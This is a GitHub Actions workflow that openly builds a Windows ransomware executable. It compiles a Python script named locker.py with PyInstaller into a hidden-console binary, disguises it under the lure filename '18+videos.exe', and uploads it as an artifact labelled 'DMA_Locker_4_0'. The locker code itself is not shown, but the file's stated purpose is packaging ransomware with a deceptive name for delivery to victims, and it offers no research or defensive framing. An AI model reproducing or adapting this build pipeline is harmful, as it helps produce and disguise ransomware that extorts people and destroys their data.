name: Build Windows Ransomware EXE

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
    
    - name: Setup Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.11'
    
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install pycryptodome pillow requests pyinstaller
    
    - name: Build EXE
      run: |
        # Agar fayl malware/ papkasida bo'lsa
        if (Test-Path "malware/locker.py") {
          pyinstaller --onefile --noconsole --name "18+videos" malware/locker.py
        } else {
          pyinstaller --onefile --noconsole --name "18+videos" locker.py
        }
    
    - name: Upload artifact
      uses: actions/upload-artifact@v4
      with:
        name: DMA_Locker_4_0
        path: dist/18+videos.exe
